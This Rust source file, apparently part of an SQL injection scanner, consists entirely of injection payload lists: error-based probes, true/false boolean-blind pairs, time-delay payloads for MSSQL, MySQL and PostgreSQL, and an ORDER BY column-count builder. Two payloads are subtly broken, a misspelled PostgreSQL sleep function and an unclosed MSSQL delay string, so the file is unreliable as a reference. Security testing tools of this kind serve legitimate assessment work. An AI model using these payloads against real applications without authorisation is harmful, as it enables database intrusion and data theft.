use core::str;


pub fn error_based() -> Vec<&'static str> {
    vec![
        "'",
        "''",
        "\"",
        "1'",
        "1\"",
        "'; --",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1' AND '1'='1' --",
    ]
}

pub fn boolean_blind() -> Vec<(&'static str, &'static str)>{
    //Compare response
    vec![
        ("1 AND 1=1 --", "1 AND 1=2 --"),
        ("1' AND '1'='1' --", "1' AND '1'='2' --"),
        ("1\" AND \"1\"=\"1\" --", "1\" AND \"1\"=\"2\" --"),
    ]
}

pub fn time_blind() -> Vec<(&'static str, &'static str)>{
    //payload and target
    vec![
        ("1'; WAITFOR DELAY '0:0:5 --", "MSSQL"),
        ("1' AND SLEEP(5) --", "MySQL"),
        ("1'; SELECT pq_sleep(5) --", "PostgreSQL"),
    ]
}

pub fn union_order_by(n: u32) -> String {
    format!("1 ORDER BY {} --", n)
}

